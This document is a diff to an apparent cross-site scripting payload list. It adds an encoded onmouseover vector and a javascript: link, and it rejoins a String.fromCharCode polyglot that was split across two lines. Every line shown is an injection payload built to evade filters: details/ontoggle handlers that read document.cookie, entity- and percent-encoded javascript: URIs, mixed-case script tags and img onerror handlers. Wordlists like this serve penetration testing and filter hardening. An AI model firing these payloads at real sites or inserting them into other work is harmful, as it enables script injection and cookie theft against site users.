@@ -10,6 +10,8 @@
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <a href=java%26%23x0Dscript%26%230000058alert(document%26%230000046cookie%26%230000041>search
+<a%2Fonmouseover%3D(confirm)(document.URL)>a
+<a href=javascript:origin>CLICK
 ONxss=><details open ontoggle=prompt(document.domain)+x
 ONxss=><details open ontoggle=prompt(cookie)+x
 ONxss=><details open ontoggle=prompt(document.cookie)+x
@@ -119,8 +121,7 @@ document.createElement('div').innerHTML = "<img src=1 onerror=alert()>
 <img src=1 onerror=alert(1)>
 <script>+-+-1-+-+alert(1)</script>
 <sCRipT>alert(1)</sCRiPt>
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(Strin
-g.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCo
 de(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
